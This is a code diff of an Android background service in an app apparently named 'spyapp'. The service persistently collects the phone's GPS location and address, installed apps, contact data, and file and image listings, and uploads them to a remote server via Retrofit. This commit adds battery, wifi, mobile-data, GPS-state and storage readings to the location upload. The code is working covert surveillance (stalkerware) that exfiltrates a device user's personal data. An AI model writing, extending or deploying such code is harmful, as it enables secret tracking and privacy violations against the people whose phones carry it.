@@ -1,33 +1,43 @@
 package kkactive_india.in.spyapp;
 
-import android.Manifest;
 import android.app.Activity;
 import android.app.Service;
+import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.Camera;
 import android.location.Address;
 import android.location.Geocoder;
+import android.location.LocationManager;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.IBinder;
+import android.os.StatFs;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.support.annotation.Nullable;
 import android.support.v4.app.ActivityCompat;
 import android.util.Log;
+import android.view.SurfaceHolder;
+import android.view.SurfaceView;
 import android.webkit.MimeTypeMap;
+import android.widget.Toast;
 
 import com.google.gson.Gson;
 
-import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
-import java.io.InputStream;
+import java.security.Policy;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
@@ -35,7 +45,9 @@ import java.util.Locale;
 import java.util.Timer;
 import java.util.TimerTask;
 
+import github.nisrulz.easydeviceinfo.base.EasyBatteryMod;
 import github.nisrulz.easydeviceinfo.base.EasyLocationMod;
+import github.nisrulz.easydeviceinfo.base.EasyNetworkMod;
 import kkactive_india.in.spyapp.Database.DatabaseHelper;
 import kkactive_india.in.spyapp.FilePOJO.fileBean;
 import kkactive_india.in.spyapp.ImagesPOJO.ImgBean;
@@ -54,8 +66,10 @@ import retrofit2.Retrofit;
 import retrofit2.converter.gson.GsonConverterFactory;
 import retrofit2.converter.scalars.ScalarsConverterFactory;
 
+import static kkactive_india.in.spyapp.MainActivity.getFileSize;
+
 public class MainService extends Service {
-    String lat, lon, name, phoneNumber, id, address,appName;
+    String lat, lon, name, phoneNumber, id, address, appName;
     SharedPreferences pref;
     SharedPreferences.Editor edit;
     List<ContactDatum> data = new ArrayList<>();
@@ -66,6 +80,8 @@ public class MainService extends Service {
     File file;
     List<String> list;
     Date dateFormat;
+    int Battery;
+    boolean wifi, isData, gps;
 
 
     @Nullable
@@ -75,8 +91,43 @@ public class MainService extends Service {
     }
 
     @Override
+    public void onCreate() {
+        super.onCreate();
+
+
+    }
+
+    @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         super.onStartCommand(intent, flags, startId);
+
+
+       /* boolean screenOn = false;
+
+        try{
+            // Get ON/OFF values sent from receiver ( AEScreenOnOffReceiver.java )
+            screenOn = intent.getBooleanExtra("screen_state", false);
+
+        }catch(Exception e){}
+
+        //  Toast.makeText(getBaseContext(), "Service on start :"+screenOn,
+        //Toast.LENGTH_SHORT).show();
+
+        if (!screenOn) {
+
+            // your code here
+            // Some time required to start any service
+            Log.e("ScreenState", "ScreenON");
+
+            // Toast.makeText(getBaseContext(), "Screen on, ", Toast.LENGTH_SHORT).show();
+
+        } else {
+
+            // your code here
+            // Some time required to stop any service to save battery consumption
+            Log.e("ScreenState", "ScreenOFF");
+            // Toast.makeText(getBaseContext(), "Screen off,", Toast.LENGTH_SHORT).show();
+        }*/
 
 
         pref = getSharedPreferences("pref", Activity.MODE_PRIVATE);
@@ -119,6 +170,7 @@ public class MainService extends Service {
                 }
 
 
+                
 
 
        /* ActivityCompat.requestPermissions(getApplicationContext(),
@@ -188,15 +240,48 @@ public class MainService extends Service {
 
                 Log.e("ImageFiles", String.valueOf(file));
 
-               // images();
+                //images();
 
 
-                getAllFilesOfDir(Environment.getExternalStorageDirectory());
+                //getAllFilesOfDir(Environment.getExternalStorageDirectory());
 
-               // files();
+                ///files();
 
                 appsDetails();
                 detailsApi();
+
+
+                EasyBatteryMod easyBatteryMod = new EasyBatteryMod(getApplicationContext());
+
+                Battery = easyBatteryMod.getBatteryPercentage();
+
+                Log.e("BatteryPercentage", String.valueOf(Battery));
+
+                EasyNetworkMod easyNetworkMod = new EasyNetworkMod(getApplicationContext());
+
+                wifi = easyNetworkMod.isWifiEnabled();
+
+                Log.e("Wifi", String.valueOf(wifi));
+
+                ConnectivityManager mgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+                NetworkInfo netInfo = mgr.getActiveNetworkInfo();
+
+                isData = netInfo.getType() == ConnectivityManager.TYPE_MOBILE;
+
+                Log.e("DATAIS", String.valueOf(isData));
+
+                LocationManager locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+                if (locManager != null) {
+                    gps = locManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
+
+                    Log.e("LocationBhai", String.valueOf(gps));
+                }
+
+                getAvailableInternalMemorySize();
+                getTotalInternalMemorySize();
+
+                Log.e("InternelMaiHaiMemory", getAvailableInternalMemorySize());
+                Log.e("TotInternelMaiHaiMemory", getTotalInternalMemorySize());
 
 
             }
@@ -206,26 +291,38 @@ public class MainService extends Service {
         return START_STICKY;
     }
 
-    public void appsDetails(){
+    public static String getAvailableInternalMemorySize() {
+        File path = Environment.getDataDirectory();
+        StatFs stat = new StatFs(path.getPath());
+        long blockSize = stat.getBlockSizeLong();
+        long availableBlocks = stat.getAvailableBlocksLong();
+        return getFileSize(availableBlocks * blockSize);
+    }
+
+    public static String getTotalInternalMemorySize() {
+        File path = Environment.getDataDirectory();
+        StatFs stat = new StatFs(path.getPath());
+        long blockSize = stat.getBlockSizeLong();
+        long totalBlocks = stat.getBlockCountLong();
+        return getFileSize(totalBlocks * blockSize);
+    }
+
+    public void appsDetails() {
 
         List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
         apps = new ArrayList<>();
-        for (int i=0; i < packList.size(); i++)
-        {
+        for (int i = 0; i < packList.size(); i++) {
             PackageInfo packInfo = packList.get(i);
-            if (  (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
-            {
+            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                 appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                 // Drawable icon = packInfo.applicationInfo.loadIcon(getPackageManager());
                 long batch_date = packInfo.firstInstallTime;
                 dateFormat = new Date(batch_date);
-                Log.e("App № " , appName );
+                Log.e("App № ", appName);
                 Log.e("date", String.valueOf(dateFormat));
                 // Log.e("icon", String.valueOf(icon));
 
-
             }
-
 
             DatabaseHelper db = new DatabaseHelper(getApplicationContext());
 
@@ -235,7 +332,7 @@ public class MainService extends Service {
         }
     }
 
-    public void detailsApi(){
+    public void detailsApi() {
 
         if (cd.isConnectingToInternet()) {
 
@@ -276,17 +373,17 @@ public class MainService extends Service {
 
 
             String id = pref.getString("id", "");
-            Call<detailsBean> call = cr.details(id,jsonStr);
+            Call<detailsBean> call = cr.details(id, jsonStr);
             call.enqueue(new Callback<detailsBean>() {
                 @Override
                 public void onResponse(Call<detailsBean> call, Response<detailsBean> response) {
-                    Log.e("DetailsGayi?","HaanGayi");
+                    Log.e("DetailsGayi?", "HaanGayi");
                 }
 
                 @Override
                 public void onFailure(Call<detailsBean> call, Throwable t) {
-                    Log.e("DetailsGayi?","NahiGayi");
-                    Log.e("YuhNahiGayi",t.toString());
+                    Log.e("DetailsGayi?", "NahiGayi");
+                    Log.e("YuhNahiGayi", t.toString());
                 }
             });
 
@@ -340,6 +437,7 @@ public class MainService extends Service {
 
 
     }
+
 
     public void files() {
 
@@ -470,7 +568,8 @@ public class MainService extends Service {
                     .build();
             Allapi cr = retrofit.create(Allapi.class);
             String id = pref.getString("id", "");
-            Call<locationBean> call = cr.latlon(id, lat, lon,address);
+            Call<locationBean> call = cr.latlon(id, lat, lon, address, String.valueOf(Battery), getAvailableInternalMemorySize(),
+                    getTotalInternalMemorySize(), String.valueOf(wifi), String.valueOf(gps), String.valueOf(isData));
             call.enqueue(new Callback<locationBean>() {
                 @Override
                 public void onResponse(Call<locationBean> call, Response<locationBean> response) {
